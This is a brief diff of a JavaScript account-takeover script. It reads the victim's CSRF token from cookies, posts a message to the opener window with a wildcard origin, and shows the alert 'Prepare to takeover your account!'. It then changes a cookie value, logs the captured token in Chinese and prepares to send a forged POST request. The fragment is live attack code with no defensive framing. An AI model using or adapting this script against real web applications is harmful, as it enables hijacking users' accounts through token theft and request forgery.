@@ -16,7 +16,7 @@ const csrfToken = getCookieValue('csrftoken');
 if (csrfToken) {
     window.opener.postMessage({ type: 'pause' }, '*');
     alert("Prepare to takeover your account!");
-    document.cookie = '_TEA_VE_APIHOST=1; path=/;';
+    document.cookie = '_TEA_VE_APIHOST=2; path=/;';
     console.log('[+] 已获取 csrftoken:', csrfToken);
     
     // 发送 POST 请求
